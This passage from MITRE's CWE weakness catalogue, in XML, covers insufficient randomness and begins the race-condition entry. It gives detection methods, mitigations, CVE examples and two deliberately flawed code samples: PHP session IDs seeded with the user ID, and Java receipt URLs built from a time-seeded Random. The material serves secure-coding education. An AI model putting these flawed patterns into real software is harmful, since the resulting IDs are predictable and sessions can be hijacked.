               <Consequence_Technical_Impact>Other</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If software relies on unique, unguessable IDs to identify a resource,
							an attacker might be able to guess an ID for a resource that is owned by
							another user. The attacker could then read the resource, or pre-create a
							resource with the same ID to prevent the legitimate program from
							properly sending the resource to the intended user. For example, a
							product might maintain session information in a file whose name is based
							on a username. An attacker could pre-create this file for a victim user,
							then set the permissions so that the application cannot generate the
							session for the victim, preventing the victim from using the
							application.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>When an authorization or authentication mechanism relies on random
							values to restrict access to restricted functionality, such as a session
							ID or a seed for generating a cryptographic key, then an attacker may
							access the restricted functionality by guessing the ID or key.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-11.4">
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Use monitoring tools that examine the software's process as it
							interacts with the operating system and the network. This technique is
							useful in cases when source code is unavailable, if the software was not
							developed by you, or if you want to verify that the build phase did not
							introduce any new weaknesses. Examples include debuggers that directly
							attach to the running process; system-call tracing utilities such as
							truss (Solaris) and strace (Linux); system activity monitors such as
							FileMon, RegMon, Process Monitor, and other Sysinternals utilities
							(Windows); and sniffers and protocol analyzers that monitor network
							traffic.</Text>
                  <Text>Attach the monitor to the process and look for library functions that
							indicate when randomness is being used. Run the process multiple times
							to see if the seed changes. Look for accesses of devices or equivalent
							resources that are commonly used for strong (or weak) randomness, such
							as /dev/urandom on Linux. Look for library or system calls that access
							predictable information such as process IDs and system time.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Man-in-the-middle attack tool</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use a well-vetted algorithm that is currently considered to be strong
							by experts in the field, and select well-tested implementations with
							adequate length seeds.</Text>
                  <Text>In general, if a pseudo-random number generator is not advertised as
							being cryptographically secure, then it is probably a statistical PRNG
							and should not be used in security-sensitive contexts.</Text>
                  <Text>Pseudo-random number generators can produce predictable numbers if the
							generator is known and the seed can be guessed. A 256-bit seed is a good
							starting point for producing a "random enough" number.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Consider a PRNG that re-seeds itself as needed from high quality
							pseudo-random output sources, such as hardware devices.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Testing</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use automated static analysis tools that target this type of weakness.
							Many modern techniques use data flow analysis to minimize the number of
							false positives. This is not a perfect solution, since 100% accuracy and
							coverage are not feasible.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use products or modules that conform to FIPS 140-2 [R.330.1] to avoid
							obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random
							Number Generators").</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Testing</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use tools and techniques that require manual (human) analysis, such as
							penetration testing, threat modeling, and interactive tools that allow
							the tester to record and modify an active session. These may be more
							effective than strictly automated techniques. This is especially the
							case with weaknesses that are related to design and business
							rules.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-45">
               <Intro_Text>This code generates a unique random identifier for a user's
						session.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> function generateSessionID($userID){</Code>
                     <Block>
                        <Code> srand($userID);</Code>
                        <Code> return rand();</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>Because the seed for the PRNG is always the user's ID, the session ID
							will always be the same. An attacker could thus predict any user's
							session ID and potentially hijack the session.</Text>
                  <Text>This example also exhibits a Small Seed Space (CWE-339).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-46">
               <Intro_Text>The following code uses a statistical PRNG to create a URL for a
						receipt that remains active for some period of time after a
						purchase.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String GenerateReceiptURL(String baseUrl) {</Code>
                     <Block>
                        <Code>Random ranGen = new Random();</Code>
                        <Code>ranGen.setSeed((new Date()).getTime());</Code>
                        <Code>return(baseUrl + ranGen.nextInt(400000000) + ".html");</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This code uses the Random.nextInt() function to generate "unique"
							identifiers for the receipt pages it generates. Because Random.nextInt()
							is a statistical PRNG, it is easy for an attacker to guess the strings
							it generates. Although the underlying design of the receipt system is
							also faulty, it would be more secure if it used a random number
							generator that did not produce predictable receipt identifiers, such as
							a cryptographic PRNG.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3278</Observed_Example_Reference>
               <Observed_Example_Description>Crypto product uses rand() library function to
						generate a recovery key, making it easier to conduct brute force
						attacks.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3238</Observed_Example_Reference>
               <Observed_Example_Description>Random number generator can repeatedly generate
						the same value.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2367</Observed_Example_Reference>
               <Observed_Example_Description>Web application generates predictable session IDs,
						allowing session hijacking.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2158</Observed_Example_Reference>
               <Observed_Example_Description>Password recovery utility generates a relatively
						small number of random passwords, simplifying brute force
						attacks.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0255</Observed_Example_Reference>
               <Observed_Example_Description>Cryptographic key created with a seed based on the
						system time.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5162</Observed_Example_Reference>
               <Observed_Example_Description>Kernel function does not have a good entropy
						source just after boot.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4905</Observed_Example_Reference>
               <Observed_Example_Description>Blogging software uses a hard-coded salt when
						calculating a password hash.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4929</Observed_Example_Reference>
               <Observed_Example_Description>Bulletin board application uses insufficiently
						random names for uploaded files, allowing other users to access private
						files.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3612</Observed_Example_Reference>
               <Observed_Example_Description>Handheld device uses predictable TCP sequence
						numbers, allowing spoofing or hijacking of TCP
						connections.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2433</Observed_Example_Reference>
               <Observed_Example_Description>Web management console generates session IDs based
						on the login time, making it easier to conduct session
						hijacking.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0166</Observed_Example_Reference>
               <Observed_Example_Description>SSL library uses a weak random number generator
						that only generates 65,536 unique keys.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2108</Observed_Example_Reference>
               <Observed_Example_Description>Chain: insufficient precision causes extra zero
						bits to be assigned, reducing entropy for an API function that generates
						random numbers.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2020</Observed_Example_Reference>
               <Observed_Example_Description>CAPTCHA implementation does not produce enough
						different images, allowing bypass using a database of all possible
						checksums.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0087</Observed_Example_Reference>
               <Observed_Example_Description>DNS client uses predictable DNS transaction IDs,
						allowing DNS spoofing.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0141</Observed_Example_Reference>
               <Observed_Example_Description>Application generates passwords that are based on
						the time of day.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Non-specific</Functional_Area>
            <Functional_Area>Cryptography</Functional_Area>
            <Functional_Area>Authentication</Functional_Area>
            <Functional_Area>Session management</Functional_Area>
         </Functional_Areas>
         <References>
            <Reference Reference_ID="REF-1" Local_Reference_ID="R.330.1">
               <Reference_Author>Information Technology Laboratory, National Institute of
						Standards and Technology</Reference_Author>
               <Reference_Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC
						MODULES</Reference_Title>
               <Reference_Date>2001-05-25</Reference_Date>
               <Reference_Link>http://csrc.nist.gov/publications/fips/fips140-2/fips1402.pdf</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-9" Local_Reference_ID="R.330.2">
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Author>Gary McGraw</Reference_Author>
               <Reference_Title>Building Secure Software: How to Avoid Security Problems the
						Right Way</Reference_Title>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison-Wesley</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.330.3">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 8, "Using Poor Random Numbers" Page
						259</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.330.4">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 20: Weak Random Numbers." Page 299</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Randomness and Predictability</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Insecure Randomness</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Broken Access Control</Mapped_Node_Name>
               <Mapped_Node_ID>A2</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Do not use the rand() function for generating pseudorandom
						numbers</Mapped_Node_Name>
               <Mapped_Node_ID>MSC30-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Brute Force </Mapped_Node_Name>
               <Mapped_Node_ID>11</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Credential/Session Prediction </Mapped_Node_Name>
               <Mapped_Node_ID>18</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Generate strong random numbers</Mapped_Node_Name>
               <Mapped_Node_ID>MSC02-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not use the rand() function for generating pseudorandom
						numbers</Mapped_Node_Name>
               <Mapped_Node_ID>MSC30-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure your random number generator is properly
						seeded</Mapped_Node_Name>
               <Mapped_Node_ID>MSC32-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>112</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>485</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>59</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Relationships, Other_Notes,
						Relationship_Notes, Taxonomy_Mappings,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Likelihood_of_Exploit, Other_Notes,
						Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Description, Observed_Examples, Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">Randomness and
						Predictability</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="362" Name="Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')" Weakness_Abstraction="Class" Status="Draft">
         <Description>
            <Description_Summary>The program contains a code sequence that can run concurrently
					with other code, and the code sequence requires temporary, exclusive access to a
					shared resource, but a timing window exists in which the shared resource can be
					modified by another code sequence that is operating
					concurrently.</Description_Summary>
            <Extended_Description>
               <Text>This can have security implications when the expected synchronization is
						in security-critical code, such as recording whether a user is authenticated
						or modifying important state information that should not be influenced by an
						outsider.</Text>
               <Text>A race condition occurs within concurrent environments, and is effectively
						a property of a code sequence. Depending on the context, a code sequence may
						be in the form of a function call, a small number of instructions, a series
						of program invocations, etc.</Text>
               <Text>A race condition violates these properties, which are closely
						related:</Text>
               <Block Block_Nature="List">
                  <Text>Exclusivity - the code sequence is given exclusive access to the
							shared resource, i.e., no other code sequence can modify properties of
							the shared resource before the original sequence has completed
							execution.</Text>
                  <Text>Atomicity - the code sequence is behaviorally atomic, i.e., no other
							thread or process can concurrently execute the same sequence of
							instructions (or a subset) against the same resource. </Text>
               </Block>
               <Text>A race condition exists when an "interfering code sequence" can still
						access the shared resource, violating exclusivity. Programmers may assume
						that certain code sequences execute too quickly to be affected by an
						interfering code sequence; when they are not, this violates atomicity. For
						example, the single "x++" statement may appear atomic at the code layer, but
						it is actually non-atomic at the instruction layer, since it involves a read
						(the original value of x), followed by a computation (x+1), followed by a
						write (save the result to x). </Text>
               <Text>The interfering code sequence could be "trusted" or "untrusted." A trusted
						interfering code sequence occurs within the program; it cannot be modified
						by the attacker, and it can only be invoked indirectly. An untrusted
						interfering code sequence can be authored directly by the attacker, and
						typically it is external to the vulnerable program.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>691</Relationship_Target_ID>
               <!--Insufficient Control Flow Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>361</Relationship_Target_ID>
               <!--Time and State--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>743</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>751</Relationship_Target_ID>
               <!--2009 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>852</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 07 - Visibility and Atomicity (VNA)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>877</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>882</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 14 - Concurrency (CON)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>988</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Race Condition Window--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language Language_Name="C" Prevalence="Sometimes"/>
               <Language Language_Name="C++" Prevalence="Sometimes"/>
               <Language Language_Name="Java" Prevalence="Sometimes"/>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Prevalence="Often" Architectural_Paradigm_Name="Concurrent Systems Operating on Shared Resources"/>
            </Architectural_Paradigms>
         </Applicable_Platforms>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>The relationship between race conditions and synchronization problems
						(CWE-662) needs to be further developed. They are not necessarily two
						perspectives of the same core concept, since synchronization is only one
						technique for avoiding race conditions, and synchronization can be used for
						other purposes besides race condition prevention.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: resource consumption
						(CPU)</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(memory)</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(other)</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>When a race condition makes it possible to bypass a resource cleanup
							routine or trigger multiple initialization routines, it may lead to
							resource exhaustion (CWE-400).</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: instability</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>When a race condition allows multiple control flows to access a
							resource simultaneously, it might lead the program(s) into unexpected
							states, possibly resulting in a crash.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Read files or
						directories</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>When a race condition is combined with predictable resource names and
							loose permissions, it may be possible for an attacker to overwrite or
							access confidential data (CWE-59).</Text>
               </Consequence_Note>
